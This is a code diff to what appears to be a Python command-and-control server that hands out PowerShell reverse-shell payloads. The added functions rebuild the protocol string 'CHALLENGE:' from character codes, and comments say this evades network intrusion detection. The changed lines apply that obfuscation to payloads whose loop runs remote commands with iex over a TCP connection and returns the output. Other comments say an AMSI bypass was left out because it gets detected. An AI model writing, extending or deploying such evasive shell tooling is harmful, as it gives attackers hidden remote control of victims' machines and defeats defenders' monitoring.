@@ -446,6 +446,23 @@ def obfuscate_vars(script):
     
     return script
 
+
+def get_obfuscated_challenge_check():
+    """Generate obfuscated CHALLENGE: string check for payloads."""
+    # Instead of literal "CHALLENGE:", build it from char codes
+    # This evades NIDS looking for the string
+    return '''$cstr=(-join([char]67,[char]72,[char]65,[char]76,[char]76,[char]69,[char]78,[char]71,[char]69,[char]58));if($ch.StartsWith($cstr))'''
+
+
+def obfuscate_protocol_strings(script):
+    """Replace C2 protocol strings with obfuscated versions."""
+    # Replace CHALLENGE: check with obfuscated version
+    script = script.replace(
+        'if($ch.StartsWith("CHALLENGE:"))',
+        '$cstr=(-join([char]67,[char]72,[char]65,[char]76,[char]76,[char]69,[char]78,[char]71,[char]69,[char]58));if($ch.StartsWith($cstr))'
+    )
+    return script
+
 def get_tls_payload(ip, port, secret):
     """Generate TLS+handshake payload for persistence scripts."""
     return f'''while(1){{try{{
@@ -750,8 +767,8 @@ $w.WriteLine($resp);
 }}
 while($t.Connected){{$w.Write("PS>");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
 }}catch{{}};Start-Sleep -Seconds 5}}'''
-            # Apply evasion - NO AMSI bypass (gets detected), just variable obfuscation
-            final_payload = obfuscate_vars(core_payload)
+            # Apply evasion - variable obfuscation + protocol string obfuscation
+            final_payload = obfuscate_protocol_strings(obfuscate_vars(core_payload))
             
             self.send_response(200)
             self.send_header('Content-type', 'text/plain')
@@ -820,8 +837,8 @@ $w.WriteLine($resp);
 while($t.Connected){{$w.Write("PS>");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
 }}catch{{}};Start-Sleep -Seconds 6}}'''
             
-            # Apply evasion - NO AMSI bypass (gets detected), just obfuscation
-            final_payload = obfuscate_vars(core_payload)
+            # Apply evasion - variable + protocol string obfuscation
+            final_payload = obfuscate_protocol_strings(obfuscate_vars(core_payload))
             
             self.send_response(200)
             self.send_header('Content-type', 'text/plain')
